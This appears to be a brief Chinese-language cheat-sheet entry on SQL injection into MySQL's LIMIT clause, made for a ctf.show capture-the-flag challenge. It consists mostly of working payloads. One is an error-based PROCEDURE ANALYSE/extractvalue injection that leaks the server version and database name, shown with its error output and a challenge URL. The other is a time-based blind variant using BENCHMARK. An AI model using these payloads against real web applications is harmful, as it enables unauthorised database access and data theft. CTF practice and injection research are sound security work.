## **limit报错注入**
```
mysql> SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 

ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'

```
场景
```
http://47e30f87-1f8b-4cca-a35f-b4d1aa4049d5.challenge.ctf.show/api/?id=1&page=1&limit=10

/api/index.php?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);
```
貌似难利用

^
## **limit时间盲注**
```
SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

